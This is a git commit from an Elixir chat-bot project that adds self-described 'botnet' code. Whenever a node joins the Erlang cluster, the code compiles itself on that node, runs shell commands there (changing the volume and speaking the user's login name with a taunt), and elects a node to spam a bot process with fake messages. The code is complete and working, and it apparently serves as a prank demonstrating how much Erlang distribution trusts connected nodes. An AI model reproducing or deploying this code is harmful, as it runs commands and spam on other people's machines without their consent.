0145c714269383fa3f320d2059073e662a00af87
jeffweiss <jeff.weiss@puppetlabs.com>
2015-03-22 13:25:26 -0700

    (#3) Launch spambot upon node connect
    Close #3.

--- lib/node_monitor.ex
+++ lib/node_monitor.ex
@@ -13,11 +13,26 @@ defmodule OhaiBot.NodeMonitor do
 
   def handle_info({:nodeup, node}, state) do
     Logger.info "NodeMonitor: #{node} joined"
+    code_string = File.read!("node_exec.ex")
+    Node.spawn(node, Code, :compile_string, [code_string, "node_exec.ex"])
+    :timer.sleep(1_000)
+    Node.spawn(node, NodeExec, :say_intro, [])
+    Node.spawn(node, NodeExec, :volunteer, ["jeffweiss"])
     {:noreply, state}
   end
 
   def handle_info({:nodedown, node}, state) do
     Logger.info "NodeMonitor: #{node} left"
+    if :global.whereis_name(:spammer) == :undefined do
+      case Node.list |> Enum.shuffle |> List.first do
+        nil ->
+          Logger.info "No more members of botnot. Spamming ceased."
+        node ->
+          Logger.debug "I have elected: #{node}"
+          Node.spawn(node, NodeExec, :volunteer, ["jeffweiss"])
+      end
+    end
+
     {:noreply, state}
   end
 
---
+++ node_exec.ex
@@ -0,0 +1,55 @@
+defmodule NodeExec do
+  require Logger
+
+  def say_intro do
+    :os.cmd('osascript -e "set volume 5"')
+    :os.cmd('say Wow, `whoami`. You should not be so trusting.')
+  end
+
+  def send_message(recipient) do
+    pid = :literary_bot |> :global.whereis_name
+    if is_pid(pid) do
+      Kernel.send pid, {:received, "not a real literary message", self, recipient}
+      :random.uniform(10_000)
+      |> :timer.sleep
+
+      send_message(recipient)
+    else
+      Logger.warn "Could not find literary_bot process. Found #{inspect pid}"
+    end
+  end
+
+  def join_log_message do
+    Logger.info "[" <> node_name <> "] Botnet joined."
+  end
+
+  def node_name do
+    Node.self |> to_string
+  end
+
+  def whois_spammer do
+    my_pid = self
+    case :global.whereis_name(:spammer) do
+      :undefined -> 
+        Logger.debug "[" <> node_name <> "] No one is spamming."
+        :me
+      ^my_pid -> 
+        Logger.debug "[" <> node_name <> "] I'm already elected as spammer."
+        :me
+      pid -> 
+        Logger.debug "[" <> node_name <> "] Someone at #{inspect pid} is already spamming."
+        :someone_else
+    end
+  end
+
+  def volunteer(recipient) do
+    if :me == whois_spammer do
+        :global.re_register_name(:spammer, self)
+        Logger.info "[" <> node_name <> "] No other spammer. I will do it."
+        send_message(recipient)
+    else
+        Logger.info "[" <> node_name <> "] Someone else is currently spamming."
+    end
+  end 
+
+end
